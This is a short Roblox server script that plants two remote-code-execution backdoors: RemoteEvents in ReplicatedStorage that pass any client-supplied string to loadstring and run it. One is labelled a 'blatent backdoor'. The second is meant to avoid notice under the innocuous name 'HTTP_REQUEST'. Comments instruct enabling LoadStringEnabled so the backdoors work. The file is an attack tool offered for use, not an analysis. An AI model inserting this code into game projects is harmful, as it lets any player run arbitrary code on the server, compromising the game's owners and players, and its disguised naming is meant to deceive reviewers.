--// create script in serverscriptservice
--// note, make sure to turn on loadstringenabled inside of "serverscriptservice" or this will completely break.

----------------------------------------------------------------------------

-- blatent backdoor
local BackDoorName = "NameOfRemote/Backdoor"


local backdoor = Instance.new("RemoteEvent", game.ReplicatedStorage)
backdoor.Name = BackDoorName
backdoor.OnServerEvent:connect(function(player, SS)
    loadstring(SS)()
end)
-- non blatent



pa = game.ReplicatedStorage
local Event = Instance.new("RemoteEvent",pa)
Event.Name = "HTTP_REQUEST"
Event.OnServerEvent:connect(function(player, RRRR)
    loadstring(RRRR)()
end)
